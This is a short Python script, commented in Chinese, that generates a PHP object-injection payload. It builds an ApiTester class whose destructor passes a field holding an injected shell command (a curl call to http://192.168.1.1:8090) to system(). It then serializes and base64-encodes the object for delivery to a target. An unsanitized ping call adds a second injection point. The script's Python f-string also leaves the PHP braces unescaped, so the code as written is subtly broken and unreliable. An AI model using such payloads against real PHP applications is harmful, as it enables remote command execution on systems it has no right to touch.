import subprocess

# 輸入自定義的 `curl` 指令部分
custom_curl_command = "curl http://192.168.1.1:8090"

# 動態生成 PHP 程式碼
php_code =f"""
<?php
class ApiTester {
    public $ip;
    private $res = "' && {custom_curl_command} && echo'";

    public function __construct($ip) {
        $this->ip = $ip;
    }

    public function __invoke() {
        $this->res = system("ping " . $this->ip);
    }

    public function __destruct() {
        system("echo '" . $this->res . "' > C:/logs/test.log");
    }
}
$api = new ApiTester('127.0.0.1');
$payload = base64_encode(serialize($api));
echo $payload;
"""
# 將 PHP 程式碼保存到臨時文件
with open("temp_script.php", "w") as file:
    file.write(php_code)

# 執行 PHP 文件
result = subprocess.run(['php', 'temp_script.php'], capture_output=True, text=True)

# 獲取輸出
print("PHP Output:", result.stdout)



